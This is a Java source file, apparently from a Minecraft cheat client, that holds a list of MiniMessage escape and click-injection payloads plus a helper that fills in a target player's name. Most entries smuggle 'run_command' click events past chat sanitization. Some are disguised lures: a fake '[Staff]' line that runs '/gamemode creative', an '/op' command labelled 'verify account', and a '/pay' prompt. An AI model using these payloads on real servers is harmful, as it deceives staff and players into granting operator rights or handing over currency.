package com.dupeclient.client.module.fuzzer;

import java.util.ArrayList;
import java.util.List;

/**
 * MiniMessage escape / click-injection probes inspired by layered-tag sanitization bypasses
 * (see <a href="https://www.khaodoes.dev/blog/minimessage-escape-exploit">khao's write-up</a>).
 */
public final class MinimessageFuzzerValues {
    private MinimessageFuzzerValues() {
    }

    public static List<String> all() {
        List<String> v = new ArrayList<>();
        v.add("<red>hello");
        v.add("<red></red><click:run_command:/help>click me</click>");
        v.add("<i><red></red><click:run_command:/help>nested</click></i>");
        v.add("<red><click:run_command:/say test>pay me</click>");
        v.add("<hover:show_text:'<click:run_command:/help>inner</click>'>hover</hover>");
        v.add("<click:run_command:/op %s>verify account</click>");
        v.add("<red:red:red>triple");
        v.add("<<red>broken open");
        v.add("<red>visible</red><click:run_command:/list>staff check</click>");
        v.add("<underlined><click:run_command:/plugins>plugins</click></underlined>");
        v.add("<red></red></red><click:run_command:/version>v</click>");
        v.add("<click:suggest_command:/pay %s 1>click to pay</click>");
        v.add("<click:open_url:https://example.com>link</click>");
        v.add("<rainbow>rainbow <click:run_command:/help>x</click></rainbow>");
        v.add("<red><click:run_command:'/say \\'escaped\\''>quote test</click>");
        v.add("<!red>bang escape");
        v.add("<red\\>backslash");
        v.add("<red><click:run_command:/execute as @s run help>exec</click>");
        v.add("<gray>[Staff]<reset> <click:run_command:/gamemode creative>Click to restore</click>");
        return v;
    }

    public static String formatForTarget(String template, String targetPlayer) {
        String player = targetPlayer == null || targetPlayer.isBlank() ? "Steve" : targetPlayer.trim();
        return template.replace("%s", player);
    }
}
